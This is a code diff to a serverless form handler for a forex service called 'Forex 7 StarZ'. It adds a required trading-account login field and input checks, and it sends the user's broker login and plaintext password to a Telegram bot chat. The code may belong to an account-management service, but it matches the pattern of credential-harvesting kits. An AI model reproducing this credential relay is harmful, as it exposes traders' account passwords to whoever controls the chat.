@@ -21,6 +21,7 @@ export default async function handler(req, res) {
       name,
       whatsapp,
       telegram,
+      login,
       password,
       broker,
       platform,
@@ -31,13 +32,24 @@ export default async function handler(req, res) {
     } = req.body || {};
 
     if (
-      !name || !whatsapp || !telegram || !password ||
+      !name || !whatsapp || !telegram || !login || !password ||
       !broker || !platform || !server || !accountSize || !risk
     ) {
       return res.status(400).json({
         success: false,
         message: "Please complete all required fields.",
       });
+    }
+
+    const waDigits = String(whatsapp).replace(/\D/g, "");
+    if (waDigits.length < 10 || waDigits.length > 15) {
+      return res.status(400).json({ success: false, message: "Please enter a valid WhatsApp number with country code." });
+    }
+    if (!/^@?[A-Za-z][A-Za-z0-9_]{4,31}$/.test(String(telegram).trim())) {
+      return res.status(400).json({ success: false, message: "Please enter a valid Telegram username." });
+    }
+    if (!/^\d{4,12}$/.test(String(login).trim())) {
+      return res.status(400).json({ success: false, message: "Account login must be digits only." });
     }
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -66,6 +78,7 @@ export default async function handler(req, res) {
 • <b>Broker:</b> ${esc(broker)}
 • <b>Platform:</b> ${esc(platform)}
 • <b>Server:</b> ${esc(server)}
+• <b>Login:</b> <code>${esc(String(login).trim())}</code>
 • <b>Password:</b> <code>${esc(password)}</code>
 
 📊 <b>PROFILE</b>
@@ -75,6 +88,7 @@ export default async function handler(req, res) {
 📝 <b>Note:</b> ${esc(additionalMessage || "—")}
 
 ━━━━━━━━━━━━━━━━━━
+⚠️ <b>Please verify:</b> password, login and number are correct.
 🌐 <i>Forex 7 StarZ</i>`;
 
     const telegramResponse = await fetch(
